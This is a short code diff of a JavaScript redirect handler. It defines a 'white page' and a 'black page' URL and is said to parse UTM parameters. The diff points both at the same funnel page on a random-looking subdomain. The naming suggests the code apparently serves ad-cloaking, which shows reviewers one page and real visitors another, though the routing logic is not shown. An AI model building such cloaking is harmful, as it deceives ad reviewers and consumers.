@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://theme352-watches.myshopify.com/collections/accessories/products/stuhrling-original-womens-946l-03-winchester-swarovski-crystal-accented-23k-gold-layered-watch-with-champagne-leather-band?variant=43468986249";
+    const whitePageURL = "https://jsdfuuweriajdhyeqzkaiqw.myfunnelish.com/jj-dd-spr";
     const blackPageURL = "https://jsdfuuweriajdhyeqzkaiqw.myfunnelish.com/jj-dd-spr";
   
     // Parse the UTM parameters from the request URL
